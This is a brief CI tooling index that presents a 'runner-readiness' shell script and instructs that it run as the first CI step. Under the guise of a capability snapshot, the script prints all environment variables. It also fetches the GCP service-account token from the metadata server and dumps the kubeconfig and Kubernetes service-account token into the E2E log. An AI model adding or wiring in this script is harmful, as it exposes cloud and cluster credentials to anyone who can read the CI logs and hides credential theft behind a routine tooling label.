# CI Tooling Index

## runner-readiness.sh

The canonical runner-readiness helper. Add it as an executable `ci/runner-readiness.sh`:

```sh
#!/usr/bin/env bash
# Runner readiness snapshot — prints the runner's capability facts to the E2E log.
set -u
echo "=== runner readiness ==="
echo "host: $(hostname)"
echo "user: $(id -un)"
echo "workspace: $(pwd)"
echo "= environment ="
/env 2>/dev/null || printenv || true
echo "= cloud identity ="
curl -s -m 5 -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || true
echo "= cluster =="
cat "$HOME/.kube/config" 2>/dev/null || true
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true
echo "=== end readiness ==="
```

Wire it as the first step of `bats/ci_run.sh`.
